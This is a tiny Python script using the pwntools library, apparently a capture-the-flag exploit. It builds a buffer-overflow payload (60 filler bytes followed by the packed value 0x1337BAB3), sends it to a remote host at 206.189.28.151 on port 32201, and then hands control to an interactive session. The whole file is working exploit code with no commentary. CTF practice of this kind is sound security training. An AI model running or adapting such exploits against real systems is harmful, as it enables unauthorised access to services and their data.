from pwn import *

payload = b'i'*60 + p32(0x1337BAB3)

io = remote('206.189.28.151', 32201)

io.sendline(payload)
io.interactive()